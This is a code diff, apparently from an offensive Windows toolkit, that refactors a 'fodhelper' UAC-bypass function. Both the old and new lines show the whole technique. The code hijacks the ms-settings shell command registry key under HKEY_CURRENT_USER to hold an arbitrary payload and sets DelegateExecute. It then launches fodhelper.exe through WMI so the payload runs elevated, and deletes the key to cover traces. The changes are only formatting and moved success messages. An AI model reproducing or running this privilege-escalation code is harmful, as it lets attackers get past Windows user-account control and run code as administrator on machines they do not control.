@@ -28,26 +28,15 @@ def fodhelper(payload):
 	print_info("Payload: {}".format(payload))
 	print_info("Hijacking Software\\Classes\\ms-settings\\shell\\open\\command")
 	try:
-		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
-								os.path.join("Software\Classes\ms-settings\shell\open\command"))
-									
-		_winreg.SetValueEx(key,
-							None,
-							0,
-							_winreg.REG_SZ,
-							payload)
-
-		_winreg.SetValueEx(key,
-							"DelegateExecute",
-							0,
-							_winreg.REG_SZ,
-							None)
-
+		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,os.path.join("Software\Classes\ms-settings\shell\open\command"))						
+		_winreg.SetValueEx(key,None,0,_winreg.REG_SZ,payload)
+		_winreg.SetValueEx(key,"DelegateExecute",0,_winreg.REG_SZ,None)
 		_winreg.CloseKey(key)
-		print_success("Successfully created Default and DelegateExecute key")
 	except Exception as error:
 		print_error("Unable to create Default and DelegateExecute key")
 		return False
+	else:
+		print_success("Successfully created Default and DelegateExecute key")
 
 	print_info("Pausing for 5 seconds before executing")
 	time.sleep(5)
@@ -55,7 +44,7 @@ def fodhelper(payload):
 	print_info("Attempting to create process (cmd.exe /c start fodhelper.exe)")
 	try:
 		result = wmi.Win32_Process.Create(CommandLine="cmd.exe /c start fodhelper.exe",
-										ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=1))
+							ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=1))
 		if (result[1] == 0):
 			print_success("Process started successfully (cmd.exe /c start fodhelper.exe)")
 		else:
@@ -70,9 +59,9 @@ def fodhelper(payload):
 
 	print_info("Attempting to delete and restore hijacked registry keys")
 	try:
-		_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,
-						os.path.join("Software\Classes\ms-settings\shell\open\command"))
-		print_success("Successfully, our payload ({}) should now run elevated".format(payload))
+		_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,os.path.join("Software\Classes\ms-settings\shell\open\command"))
 	except Exception as error:
 		print_error("Unable to clean")
 		return False
+	else:
+		print_success("Successfully, our payload ({}) should now run elevated".format(payload))
